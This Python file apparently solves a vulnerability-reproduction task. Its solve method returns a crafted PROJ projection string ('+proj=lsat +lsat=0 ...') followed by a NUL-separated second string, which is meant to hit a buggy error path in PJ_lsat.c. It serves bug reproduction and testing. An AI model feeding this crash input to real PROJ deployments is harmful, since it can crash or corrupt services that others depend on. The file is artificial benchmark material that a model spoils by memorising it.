import os
import tarfile
from typing import Optional


class Solution:
    def _has_file_in_tar(self, tar_path: str, suffix: str) -> bool:
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf.getmembers():
                    if m.name.endswith(suffix):
                        return True
        except Exception:
            pass
        return False

    def _try_read_pj_lsat(self, src_path: str) -> Optional[str]:
        try:
            if os.path.isfile(src_path):
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        base = os.path.basename(m.name)
                        if base == "PJ_lsat.c" or base.lower() == "pj_lsat.c":
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read()
                            try:
                                return data.decode("utf-8", "replace")
                            except Exception:
                                return data.decode("latin1", "replace")
            elif os.path.isdir(src_path):
                for root, _, files in os.walk(src_path):
                    for fn in files:
                        if fn == "PJ_lsat.c" or fn.lower() == "pj_lsat.c":
                            p = os.path.join(root, fn)
                            try:
                                with open(p, "rb") as f:
                                    data = f.read()
                                try:
                                    return data.decode("utf-8", "replace")
                                except Exception:
                                    return data.decode("latin1", "replace")
                            except Exception:
                                pass
        except Exception:
            pass
        return None

    def solve(self, src_path: str) -> bytes:
        # Default robust PoC: invalid lsat parameter triggers error branch in PJ_lsat.c,
        # which is vulnerable due to a missing return statement in the buggy version.
        # Include +no_defs to minimize dependency on external defaults/data files.
        first = b"+proj=lsat +lsat=0 +path=1 +a=1 +b=1 +no_defs"

        # Provide a valid second CRS/proj string after NUL to be compatible with harnesses
        # that split input into multiple strings.
        second = b"+proj=eqc +a=1 +b=1 +no_defs"

        # If repository appears to be older PROJ4-style with proj_def.dat in-tree, +no_defs is optional;
        # keep it anyway for robustness.
        _ = self._try_read_pj_lsat(src_path)

        return first + b"\x00" + second